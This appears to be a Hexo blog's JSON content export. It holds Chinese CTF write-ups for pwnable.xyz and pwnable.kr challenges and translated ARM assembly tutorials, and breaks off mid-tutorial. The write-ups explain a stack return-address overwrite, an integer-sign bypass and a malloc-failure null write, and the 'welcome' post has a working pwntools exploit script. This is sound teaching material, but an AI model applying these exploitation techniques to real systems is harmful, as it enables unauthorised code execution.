{"meta":{"title":"Mr.red","subtitle":"","description":"Things always start to get better after you give up","author":"Xiao Hong","url":"https://github.com/xiaohong404/xiaohong404.github.io","root":"/xiaohong404.github.io/"},"pages":[{"title":"categories","date":"2020-10-19T03:31:01.000Z","updated":"2020-10-19T03:50:34.000Z","comments":true,"path":"categories/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-10-15T04:55:40.000Z","updated":"2020-10-15T10:16:30.000Z","comments":true,"path":"about/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/about/index.html","excerpt":"","text":"小红童鞋，请多指教！"},{"title":"tags","date":"2020-10-15T04:55:36.000Z","updated":"2020-10-19T03:50:04.000Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"add","slug":"PWN/Pwnable_xyz/add","date":"2020-11-13T02:42:52.000Z","updated":"2020-11-13T03:07:40.000Z","comments":true,"path":"2020/11/13/PWN/Pwnable_xyz/add/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/13/PWN/Pwnable_xyz/add/","excerpt":"","text":"查看文件保护措施 IDA64打开文件 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax __int64 v4; // [rsp+8h] [rbp-78h] __int64 v5; // [rsp+10h] [rbp-70h] __int64 v6; // [rsp+18h] [rbp-68h] __int64 v7[11]; // [rsp+20h] [rbp-60h] unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); setup(*(_QWORD *)&amp;argc, argv, envp); while ( 1 ) &#123; v4 = 0LL; v5 = 0LL; v6 = 0LL; memset(v7, 0, 0x50uLL); printf(&quot;Input: &quot;, argv, v7); if ( (unsigned int)__isoc99_scanf(&quot;%ld %ld %ld&quot;, &amp;v4, &amp;v5, &amp;v6) != 3 ) break; v7[v6] = v4 + v5; argv = (const char **)v7[v6]; printf(&quot;Result: %ld&quot;, argv); &#125; result = 0; __readfsqword(0x28u); return result;&#125; shift+F12 查看可疑字符串 明显存在栈溢出漏洞，只要v7[v6] = v4 + v5时，使得数组溢出覆盖main函数返回地址，跳转到system函数执行即可。 整理一下： 1、输入v4、v5、v6，其中v7的位置为rbp - 60h,则返回地址距离v7为60h + 8h = 104 Byte,v7数组是int64类型，每个元素占8Byte，则104/8 = 13，因此想要覆盖返回地址，至少需要填充13个元素长度，即v6=13（数组下标从0开始，0-12为13个元素，之后正好覆盖返回地址），v4 = 400822h ，v5 = 0即可设置返回地址为win函数的地址。 2、跳出while循环，使得输入scanf()!=3，输入不正确的参数数目即可 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.xyz","slug":"PWN/Pwnable-xyz","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-xyz/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"sub","slug":"PWN/Pwnable_xyz/sub","date":"2020-11-12T07:23:03.000Z","updated":"2020-11-13T02:43:12.000Z","comments":true,"path":"2020/11/12/PWN/Pwnable_xyz/sub/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/12/PWN/Pwnable_xyz/sub/","excerpt":"","text":"查看文件保护措施 查看c语言源文件 1234567891011121314151617181920212223__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v4; // [rsp+0h] [rbp-18h] int v5; // [rsp+4h] [rbp-14h] unsigned __int64 v6; // [rsp+8h] [rbp-10h] v6 = __readfsqword(0x28u); sub_A3E(); v4 = 0; v5 = 0; _printf_chk(1LL, &quot;1337 input: &quot;); _isoc99_scanf(&quot;%u %u&quot;, &amp;v4, &amp;v5); if ( v4 &lt;= 4918 &amp;&amp; v5 &lt;= 4918 ) &#123; if ( v4 - v5 == 4919 ) system(&quot;cat /flag&quot;); &#125; else &#123; puts(&quot;Sowwy&quot;); &#125; return 0LL;&#125; 显然输入使得V4-V5=4919即可，v4和v5都是int类型，但要求v4≤4918、v5≤4918v4\\leq 4918 、v5 \\leq 4918v4≤4918、v5≤4918 1、用户输入的数据类型无论是有符号或者无符号，在堆栈中以补码形式存储。 2、打印输出的数据按照打印类型的不同显示不同的结果。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.xyz","slug":"PWN/Pwnable-xyz","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-xyz/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"welcome","slug":"PWN/Pwnable_xyz/welcome","date":"2020-11-11T08:33:34.000Z","updated":"2020-11-11T14:02:12.000Z","comments":true,"path":"2020/11/11/PWN/Pwnable_xyz/welcome/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/11/PWN/Pwnable_xyz/welcome/","excerpt":"","text":"检查文件保护措施 寻找main函数地址__libc_start_main的参数值中的第一个参数是main函数的地址。 通过在gdb中的libc_start_main的开头放置一个断点来检查libc_start_main的第一个参数的值。 主函数的地址（即__libc_start_main的第一个参数值）存储在rdi寄存器中（64位函数传参顺序为rdi, rsi, rdx, rcx, r8, r9)，为0x555555554920。 IDA64打开文件 c语言代码很容易理解，即程序先分配了0x40000大小的内存，之后将返回起始地址的指针v3指向的内存值写入1，之后打印出分配的内存的起始地址以及消息的长度，之后要求用户输入一个数值，程序读取这个数值，分配相应大小的内存，之后v5 [size-1] = 0，将消息的最后一个元素设为零，因此我们可以用这部分的输入，覆盖原先分配的v3指向地址的值，使其由0变为1。但这部分malloc分配的内存位置并不确定，但如果我们可以将v5的起始地址设置为0，之后分配泄漏地址+1的大小的内存，则 [0 +泄漏地址+ 1-1] =[泄漏地址] 这样就得到了v3的地址对应的内存的值，将其覆盖为0即可使得判断条件满足。 但怎样使得malloc的返回地址为0呢？ 查看malloc的手册 手册指出在malloc分配内存失败时，会返回NULL，这会将v5的地址设置为0，这样就达成了目的。 也可以通过阅读汇编查看程序执行逻辑（不错的练习汇编的demo） 汇编代码一直到函数的ret指令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657pwndbg&gt; x /56i 0x555555554920 0x555555554920: push rbp 0x555555554921: push rbx 0x555555554922: sub rsp,0x18 0x555555554926: mov rax,QWORD PTR fs:0x28 0x55555555492f: mov QWORD PTR [rsp+0x8],rax 0x555555554934: xor eax,eax 0x555555554936: call 0x555555554b4e 0x55555555493b: lea rdi,[rip+0x2e2] # 0x555555554c24 0x555555554942: call 0x5555555548b0 &lt;puts@plt&gt; 0x555555554947: mov edi,0x40000 0x55555555494c: call 0x5555555548e8 &lt;malloc@plt&gt; 0x555555554951: lea rsi,[rip+0x2d5] # 0x555555554c2d 0x555555554958: mov rdx,rax 0x55555555495b: mov rbx,rax 0x55555555495e: mov QWORD PTR [rax],0x1 0x555555554965: mov edi,0x1 0x55555555496a: xor eax,eax 0x55555555496c: call 0x5555555548f0 &lt;__printf_chk@plt&gt; 0x555555554971: lea rsi,[rip+0x2bf] # 0x555555554c37 0x555555554978: mov edi,0x1 0x55555555497d: xor eax,eax 0x55555555497f: call 0x5555555548f0 &lt;__printf_chk@plt&gt; 0x555555554984: lea rdi,[rip+0x2c5] # 0x555555554c50 0x55555555498b: mov rsi,rsp 0x55555555498e: xor eax,eax 0x555555554990: mov QWORD PTR [rsp],0x0 0x555555554998: call 0x555555554900 &lt;__isoc99_scanf@plt&gt; 0x55555555499d: mov rdi,QWORD PTR [rsp] 0x5555555549a1: call 0x5555555548e8 &lt;malloc@plt&gt; 0x5555555549a6: lea rsi,[rip+0x2a7] # 0x555555554c54 0x5555555549ad: mov rbp,rax 0x5555555549b0: mov edi,0x1 0x5555555549b5: xor eax,eax 0x5555555549b7: call 0x5555555548f0 &lt;__printf_chk@plt&gt; 0x5555555549bc: mov rdx,QWORD PTR [rsp] 0x5555555549c0: xor edi,edi 0x5555555549c2: mov rsi,rbp 0x5555555549c5: call 0x5555555548d8 &lt;read@plt&gt; 0x5555555549ca: mov rdx,QWORD PTR [rsp] 0x5555555549ce: mov rsi,rbp 0x5555555549d1: mov edi,0x1 0x5555555549d6: mov BYTE PTR [rbp+rdx*1-0x1],0x0 0x5555555549db: call 0x5555555548b8 &lt;write@plt&gt; 0x5555555549e0: cmp QWORD PTR [rbx],0x0 0x5555555549e4: jne 0x5555555549f2 0x5555555549e6: lea rdi,[rip+0x27c] # 0x555555554c69 0x5555555549ed: call 0x5555555548c8 &lt;system@plt&gt; 0x5555555549f2: xor eax,eax 0x5555555549f4: mov rcx,QWORD PTR [rsp+0x8] 0x5555555549f9: xor rcx,QWORD PTR fs:0x28 0x555555554a02: je 0x555555554a09 0x555555554a04: call 0x5555555548c0 &lt;__stack_chk_fail@plt&gt; 0x555555554a09: add rsp,0x18 0x555555554a0d: pop rbx 0x555555554a0e: pop rbp 0x555555554a0f: ret 在第一个红色框中，通过malloc函数通过0x40000分配了空间。地址值存储在返回值RAX中（返回值存储在x64中的RAX中）。 在第二个红色框中，将引用到RAX中存储的地址的值的4btyes值替换为0x1。（QWORD PTR [RAX]，0x1） 在第三个红色框中打印RAX地址。 在第四个框中，用户输入数值并通过malloc函数分配与该输入大小相同的内存。 重点在这里，将[rbp + rdx*1 - 0x1]中存储的值更改为0x0。 之后，它将[rbx]中存储的值与0x0进行比较，如果它们相同，则调用系统函数。 因此，最后的目标是使得函数中[rbx]存储的值修改为0x0，之后调用系统函数获得flag。 寻找rbp、rdx、rbx在上图第一个红框处下断点，查看程序的执行状态，此时的寄存器值如下，可以看出，RBP是消息字符串，RDX是消息的长度。RBX是在分配了0x40000内存之后，将其对应内存地址中的值赋值为0x1。： 也就是说，[rbp + rdx*1 - 0x1]语句将用户输入的字符串的最后一个值将替换为0x0， 它将RBX的值（分配了多达0x40000的内存后分配0x1值的寄存器）与0x0进行比较。因此要将RBX的值从0x1更改为0x0。 同样如果在输入泄漏尺寸的地方输入泄漏地址+ 0x1，在输入讯息的地方不输入任何内容， RBP = 0x0 RDX =泄漏地址+ 0x1 因此，它与BYTE PTR [泄露地址]相同。 由于RDX是Leak的地址，因此可以通过访问RBX将0x1的值更改为0x0。 编写python脚本1234567891011121314from pwn import * p = remote(&quot;svc.pwnable.xyz&quot;, 30000) p.recvuntil(&quot;Leak: &quot;)addr = int(p.recv(14), 16) p.recvuntil(&quot;:&quot;)p.sendline(str(int(addr + 0x1))) p.recvuntil(&quot;:&quot;)p.send(&quot;&quot;) p.interactive() PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.xyz","slug":"PWN/Pwnable-xyz","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-xyz/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"asm","slug":"PWN/Pwnable_kr/asm","date":"2020-11-10T15:38:42.000Z","updated":"2020-11-10T16:01:32.000Z","comments":true,"path":"2020/11/10/PWN/Pwnable_kr/asm/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/10/PWN/Pwnable_kr/asm/","excerpt":"","text":"查看asm.c源文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf(&quot;seccomp error\\n&quot;); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf(&quot;seccomp error\\n&quot;); exit(0);&#125; seccomp_release(ctx);&#125;char stub[] = &quot;\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff&quot;;unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Welcome to shellcoding practice challenge.\\n&quot;); printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n&quot;); printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n&quot;); printf(&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)\\n&quot;); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub);printf(&quot;give me your x64 shellcode: &quot;); read(0, sh+offset, 1000); alarm(10); chroot(&quot;/home/asm_pwn&quot;); // you are in chroot jail. so you can&#x27;t use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 运行asm","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Part 7: 栈以及函数","slug":"ARM汇编/Part-7-栈以及函数","date":"2020-11-09T05:02:47.000Z","updated":"2020-11-10T07:57:52.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-7-栈以及函数/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-7-%E6%A0%88%E4%BB%A5%E5%8F%8A%E5%87%BD%E6%95%B0/","excerpt":"","text":"在这部分我们将研究一篇独特的内存区域叫做栈，讲解栈的目的以及相关操作。除此之外，我们还会研究ARM架构中函数的调用约定。 栈一般来说，栈是一片在程序/进程中的内存区域。这部分内存是在进程创建的时候被创建的。我们利用栈来存储一些临时数据比如说函数的局部变量，环境变量等。在之前的文章中，我们讲了操作栈的相关指令PUSH和POP。 在我们开始之前，还是了解一下栈的相关知识以及其实现方式吧。首先谈谈栈的增长，即当我们把32位的数据放到栈上时候它的变化。栈可以向上增长(当栈的实现是负向增长时)，或者向下增长(当栈的实现是正向增长时)。具体的关于下一个32位的数据被放到哪里是由栈指针来决定的，更精确的说是由SP寄存器决定。不过这里面所指向的位置，可能是当前(也就是上一次)存储的数据，也可能是下一次存储时的位置。如果SP当前指向上一次存放的数据在栈中的位置(满栈实现)，SP将会递减(降序栈)或者递增(升序栈)，然后再对指向的内容进行操作。而如果SP指向的是下一次要操作的数据的空闲位置(空栈实现)，数据会先被存放，而后SP会被递减(降序栈)或递增(升序栈)。 不同的栈实现，可以用不同情形下的多次存取指令来表示(这里很绕…): 我们的例子中，使用的是满栈降序的栈实现。让我们看一个栈相关的例子。 12345678/* azeria@labs:~$ as stack.s -o stack.o &amp;&amp; gcc stack.o -o stack &amp;&amp; gdb stack */.global mainmain: mov r0, #2 /* 设置R0 */ push &#123;r0&#125; /* 将R0存在栈上 */ mov r0, #3 /* 修改R0 */ pop &#123;r0&#125; /* 恢复R0为初始值 */ bx lr /* 程序结束 */ 在一开始，栈指针指向地址0xbefff6f8,代表着上一次入栈数据的位置。可以看到当前位置存储了一些值。 12gef&gt; x/1x $sp0xbefff6f8: 0xb6fc7000 在执行完第一条指令MOV后，栈没有改变。在只执行完下一条PUSH指令后，首先SP的值会被减4字节。之后存储在R0中的值会被存放到SP指向的位置中。现在我们在看看SP指向的位置以及其中的值。 12gef&gt; x/x $sp0xbefff6f4: 0x00000002 之后的指令将R0的值修改为3。然后我们执行POP指令将SP中的值存放到R0中，并且将SP的值加4，指向当前栈顶存放数据的位置。z最终R0的值是2。 12gef&gt; info registers r0r0 0x2 2 (下面的动图展示了低地址在顶部的栈的变化情况) 栈被用来存储局部变量，之前的寄存器状态。为了统一管理，函数使用了栈帧这个概念，栈帧是在栈内用于存储函数相关数据的特定区域。栈帧在函数开始时被创建。栈帧指针(FP)指向栈帧的底部元素，栈帧指针确定后，会在栈上申请栈帧所属的缓冲区。栈帧(从它的底部算起)一般包含着返回地址(之前说的LR)，上一层函数的栈帧指针，以及任何需要被保存的寄存器，函数参数(当函数需要4个以上参数时)，局部变量等。虽然栈帧包含着很多数据，但是这其中不少类型我们之前已经了解过了。最后，栈帧在函数结束时被销毁。 下图是关于栈帧的在栈中的位置的抽象描述(默认栈，满栈降序): 来一个例子来更具体的了解下栈帧吧: 12345678910111213141516171819202122232425/* azeria@labs:~$ gcc func.c -o func &amp;&amp; gdb func */int main()&#123; int res = 0; int a = 1; int b = 2; res = max(a, b); return res;&#125;int max(int a,int b)&#123; do_nothing(); if(a&lt;b) &#123; return b; &#125; else &#123; return a; &#125;&#125;int do_nothing()&#123; return 0;&#125; 在下面的截图中我们可以看到GDB中栈帧的相关信息: 可以看到上面的图片中我们即将离开函数max(最下面的反汇编中可以看到)。在此时，FP(R11)寄存器指向的0xbefff254就是当前栈帧的底部。这个地址对应的栈上(绿色地址区域)位置存储着0x00010418这个返回地址(LR)。再往上看4字节是0xbefff26c。可以看到这个值是上层函数的栈帧指针。在0xbefff24c和0xbefff248的0x1和0x2是函数max执行时产生的局部变量。所以栈帧包含着我们之前说过的LR，FP以及两个局部变量。 函数在开始学习ARM下的函数前，我们需要先明白一个函数的结构: 序言准备(Prologue) 函数体 结束收尾(Epilogue) 序言的目的是为了保存之前程序的执行状态(通过存储LR以及R11到栈上)以及设定栈以及局部函数变量。这些的步骤的实现可能根据编译器的不同有差异。通常来说是用PUSH/ADD/SUB这些指令。举个例子: 123push &#123;r11, lr&#125; /* 保存R11与LR */add r11, sp, #4 /* 设置栈帧底部,PUSH两个寄存器,SP加4后指向栈帧底部元素 */sub sp, sp, #16 /* 在栈上申请相应空间 */ 函数体部分就是函数本身要完成的任务了。这部分包括了函数自身的指令，或者跳转到其它函数等。下面这个是函数体的例子。 123mov r0, #1 /* 设置局部变量(a=1),同时也是为函数max准备参数a */mov r1, #2 /* 设置局部变量(b=2),同时也是为函数max准备参数b */bl max /* 分支跳转调用函数max */ 上面的代码也展示了调用函数前需要如何准备局部变量，以为函数调用设定参数。一般情况下，前四个参数通过R0-R3来传递，而多出来的参数则需要通过栈来传递了。函数调用结束后，返回值存放在R0寄存器中。所以不管max函数如何运作，我们都可以通过R0来得知返回值。而且当返回值位64位值时，使用的是R0与R1寄存器一同存储64位的值。 函数的最后一部分即结束收尾，这一部分主要是用来恢复程序寄存器以及回到函数调用发生之前的状态。我们需要先恢复SP栈指针，这个可以通过之前保存的栈帧指针寄存器外加一些加减操作做到(保证回到FP,LR的出栈位置)。而当我们重新调整了栈指针后，我们就可以通过出栈操作恢复之前保存的寄存器的值。基于函数类型的不同，POP指令有可能是结束收尾的最后一条指令。然而，在恢复后我们可能还需要通过BX指令离开函数。一个收尾的样例代码是这样的。 12sub sp, r11, #4 /* 收尾操作开始，调整栈指针，有两个寄存器要POP，所以从栈帧底部元素再减4 */pop &#123;r11, pc&#125; /* 收尾操作结束。恢复之前函数的栈帧指针，以及通过之前保存的LR来恢复PC。 */ 总结一下： 序言设定函数环境 函数体实现函数逻辑功能，将结果存到R0 收尾恢复程序状态，回到调用发生的地方。 关于函数，有一个关键点我们要知道，函数的类型分为叶函数以及非叶函数。叶函数是指函数中没有分支跳转到其他函数指令的函数。非叶函数指包含有跳转到其他函数的分支跳转指令的函数。这两种函数的实现都很类似，当然也有一些小不同。这里我们举个例子来分析一下: 1234567891011121314151617181920/* azeria@labs:~$ as func.s -o func.o &amp;&amp; gcc func.o -o func &amp;&amp; gdb func */.global mainmain: push &#123;r11, lr&#125; /* Start of the prologue. Saving Frame Pointer and LR onto the stack */ add r11, sp, #4 /* Setting up the bottom of the stack frame */ sub sp, sp, #16 /* End of the prologue. Allocating some buffer on the stack */ mov r0, #1 /* setting up local variables (a=1). This also serves as setting up the first parameter for the max function */ mov r1, #2 /* setting up local variables (b=2). This also serves as setting up the second parameter for the max function */ bl max /* Calling/branching to function max */ sub sp, r11, #4 /* Start of the epilogue. Readjusting the Stack Pointer */ pop &#123;r11, pc&#125; /* End of the epilogue. Restoring Frame pointer from the stack, jumping to previously saved LR via direct load into PC */max: push &#123;r11&#125; /* Start of the prologue. Saving Frame Pointer onto the stack */ add r11, sp, #0 /* 设置栈帧底部,PUSH一个寄存器,SP加0后指向栈帧底部元素 */ sub sp, sp, #12 /* End of the prologue. Allocating some buffer on the stack */ cmp r0, r1 /* Implementation of if(a&lt;b) */ movlt r0, r1 /* if r0 was lower than r1, store r1 into r0 */ add sp, r11, #0 /* 收尾操作开始，调整栈指针，有一个寄存器要POP，所以从栈帧底部元素再减0 */ pop &#123;r11&#125; /* restoring frame pointer */ bx lr /* End of the epilogue. Jumping back to main via LR register */ 上面的函数main以及max函数，一个是非叶函数另一个是叶函数。就像之前说的非叶函数中有分支跳转到其他函数的逻辑，函数max中没有在函数体逻辑中包含有这类代码，所以是叶函数。 除此之外还有一点不同是两类函数序言与收尾的实现是有差异的。来看看下面这段代码，是关于叶函数与非叶函数的序言部分的差异的: 12345678/* A prologue of a non-leaf function */push &#123;r11, lr&#125; /* Start of the prologue. Saving Frame Pointer and LR onto the stack */add r11, sp, #4 /* Setting up the bottom of the stack frame */sub sp, sp, #16 /* End of the prologue. Allocating some buffer on the stack *//* A prologue of a leaf function */push &#123;r11&#125; /* Start of the prologue. Saving Frame Pointer onto the stack */add r11, sp, #0 /* Setting up the bottom of the stack frame */sub sp, sp, #12 /* End of the prologue. Allocating some buffer on the stack */ 一个主要的差异是，非叶函数需要在栈上保存更多的寄存器，这是由于非叶函数的本质决定的，因为在执行时LR寄存器会被修改，所以需要保存LR寄存器以便之后恢复。当然如果有必要也可以在序言期保存更多的寄存器。 下面这段代码可以看到，叶函数与非叶函数在收尾时的差异主要是在于，叶函数的结尾直接通过LR中的值跳转回去就好，而非叶函数需要先通过POP恢复LR寄存器，再进行分支跳转。 1234567/* An epilogue of a leaf function */add sp, r11, #0 /* Start of the epilogue. Readjusting the Stack Pointer */pop &#123;r11&#125; /* restoring frame pointer */bx lr /* End of the epilogue. Jumping back to main via LR register *//* An epilogue of a non-leaf function */sub sp, r11, #4 /* Start of the epilogue. Readjusting the Stack Pointer */pop &#123;r11, pc&#125; /* End of the epilogue. Restoring Frame pointer from the stack, jumping to previously saved LR via direct load into PC */ 最后，我们要再次强调一下在函数中BL和BX指令的使用。在我们的示例中，通过使用BL指令跳转到叶函数中。在汇编代码中我们使用了标签，在编译过程中，标签被转换为对应的内存地址。在跳转到对应位置之前，BL会将下一条指令的地址存储到LR寄存器中这样我们就能在函数max完成的时候返回了。 BX指令在被用在我们离开一个叶函数时，使用LR作为寄存器参数。刚刚说了LR存放着函数调用返回后下一条指令的地址。由于叶函数不会在执行时修改LR寄存器，所以就可以通过LR寄存器跳转返回到main函数了。同样BX指令还会帮助我们切换ARM/Thumb模式。同样这也通过LR寄存器的最低比特位来完成，0代表ARM模式，1代表Thumb模式。 最后，这张动图阐述了非叶函数调用叶函数时候的内部寄存器的工作状态。 原作者在后续叶函数和非叶函数相关样例代码中将设置与恢复栈帧指针时的偏移写错了，根据栈帧设置的逻辑已经修复。","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 6:: 分支和条件执行","slug":"ARM汇编/Part-6-分支和条件执行","date":"2020-11-09T05:02:27.000Z","updated":"2020-11-10T07:29:24.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-6-分支和条件执行/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-6-%E5%88%86%E6%94%AF%E5%92%8C%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C/","excerpt":"","text":"条件执行在之前讨论CPSR寄存器那部分时，我们大概提了一下条件执行这个词。条件执行用来控制程序执行跳转，或者满足条件下的特定指令的执行。相关条件在CPSR寄存器中描述。寄存器中的比特位的变化决定着不同的条件。比如说当我们比较两个数是否相同时，我们使用的Zero比特位(Z=1)，因为这种情况下发生的运算是a-b=0。在这种情况下我们就满足了EQual的条件。如果第一个数更大些，我们就满足了更大的条件Grater Than或者相反的较小Lower Than。条件缩写都是英文首字母缩写，比如小于等于Lower Than(LE)，大于等于Greater Equal(GE)等。 下面列表是各个条件的含义以及其检测的状态位(条件指令都是其英文含义的缩写，为了便于记忆不翻译了)： 我们使用如下代码来实践条件执行相加指令： 12345678.global mainmain: mov r0, #2 /* 初始化值 */ cmp r0, #3 /* 将R0和3相比做差，负数产生则N位置1 */ addlt r0, r0, #1 /* 如果小于等于3，则R0加一 */ cmp r0, #3 /* 将R0和3相比做差，零结果产生则Z位置一，N位置恢复为0 */ addlt r0, r0, #1 /* 如果小于等于3，则R0加一R0 IF it was determined that it is smaller (lower than) number 3 */ bx lr 上面代码段中的第一条CMP指令将N位置一同时也就指明了R0比3小。之后ADDLT指令在LT条件下执行，对应到CPSR寄存器的情况时V与N比特位不能相同。在执行第二条CMP前，R0=3。所以第二条置了Z位而消除了N位。所以ADDLT不会执行R0也不会被修改，最终程序结果是3。 Thumb模式中的条件执行在指令集那篇文章中我们谈到了不同的指令集，对于Thumb中，其实也有条件执的(Thumb-2中有)。有些ARM处理器版本支持IT指令，允许在Thumb模式下条件执行最多四条指令。 相关引用：http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0552a/BABIJDIC.html 指令格式：Syntax: IT{x{y{z}}} cond cond 代表在IT指令后第一条条件执行执行指令的需要满足的条件。 x 代表着第二条条件执行指令要满足的条件逻辑相同还是相反。 y 代表着第三条条件执行指令要满足的条件逻辑相同还是相反。 z 代表着第四条条件执行指令要满足的条件逻辑相同还是相反。 IT指令的含义是“IF-Then-(Else)”，跟这个形式类似的还有： IT，If-Then，接下来的一条指令条件执行。 ITT，If-Then-Then，接下来的两条指令条件执行。 ITE，If-Then-Else，接下来的两条指令条件执行。 ITTE，If-Then-Then-Else，接下来的三条指令条件执行。 ITTEE，If-Then-Then-Else-Else，接下来的四条指令条件执行。 在IT块中的每一条条件执行指令必须是相同逻辑条件或者相反逻辑条件。比如说ITE指令，第一条和第二条指令必须使用相同的条件，而第三条必须是与前两条逻辑上相反的条件。这有一些ARM reference上的例子： 123456789101112ITTE NE ; 后三条指令条件执行ANDNE R0, R0, R1 ; ANDNE不更新条件执行相关flagsADDSNE R2, R2, #1 ; ADDSNE更新条件执行相关flagsMOVEQ R2, R3 ; 条件执行的moveITE GT ; 后两条指令条件执行ADDGT R1, R0, #55 ; GT条件满足时执行加ADDLE R1, R0, #48 ; GT条件不满足时执行加ITTEE EQ ; 后两条指令条件执行MOVEQ R0, R1 ; 条件执行MOVADDEQ R2, R2, #10 ; 条件执行ADDANDNE R3, R3, #1 ; 条件执行ANDBNE.W dloop ; 分支指令只能在IT块的最后一条指令中使用 错误的格式： 12IT NE ; 下一条指令条件执行ADD R0, R0, R1 ; 格式错误：没有条件指令 下图是条件指令后缀含义以及他们的逻辑相反指令： 让我们试试下面这段代码： 12345678910111213.syntax unified @ 这很重要！.text.global _start_start: .code 32 add r3, pc, #1 @ R3=pc+1 bx r3 @ 分支跳转到R3并且切换到Thumb模式下由于最低比特位为1 .code 16 @ Thumb模式 cmp r0, #10 ite eq @ if R0 == 10 addeq r1, #2 @ then R1 = R1 + 2 addne r1, #3 @ else R1 = R1 + 3 bkpt .code16是在Thumb模式下执行的代码。这段代码中的条件执行前提是R0等于10。ADDEQ指令代表了如果条件满足，那么就执行R1=R1+2，ADDNE代表了不满足时候的情况。 分支指令分支指令(也叫分支跳转)允许我们在代码中跳转到别的段。当我们需要跳到一些函数上执行或者跳过一些代码块时很有用。这部分的最佳例子就是条件跳转IF以及循环。先来看看IF分支。 12345678910111213.global mainmain:mov r1, #2 / 初始化 a /mov r2, #3 / 初始化 b /cmp r1, r2 / 比较谁更大些 /blt r1_lower / 如果R2更大跳转到r1_lower /mov r0, r1 / 如果分支跳转没有发生，将R1的值放到到R0 /b end / 跳转到结束 